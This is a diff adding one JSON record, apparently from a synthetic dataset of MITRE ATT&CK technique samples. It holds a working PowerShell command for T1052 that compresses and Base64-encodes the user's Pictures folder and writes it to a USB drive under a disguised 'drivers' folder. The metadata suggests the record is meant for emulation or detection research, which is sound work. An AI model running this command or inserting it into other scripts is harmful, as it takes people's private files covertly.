@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $tmp=\"$env:TEMP\\pics.zip\"; if(Test-Path $tmp){Remove-Item $tmp -Force}; Compress-Archive -Path \"$env:USERPROFILE\\Pictures\\*\" -DestinationPath $tmp -Force -ErrorAction SilentlyContinue; $dest=\"$dl`:\\drivers\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; if(Test-Path $tmp){ [Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp)) | Set-Content \"$dest\\p.dat\" -Encoding ascii; Remove-Item $tmp -Force; Write-Output \"Compressed and encoded Pictures to $dest\\p.dat at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append }",
+  "explanation": "Compresses local pictures, Base64-encodes the archive, and stores it under a benign-sounding directory on removable media to evade casual review.",
+  "rationale_steps": [
+    "Create a temporary ZIP of target data locally",
+    "Resolve removable drive destination",
+    "Encode the ZIP as Base64 and write to USB",
+    "Log the operation via Write-Output and clean up"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-4fe8ad1a",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
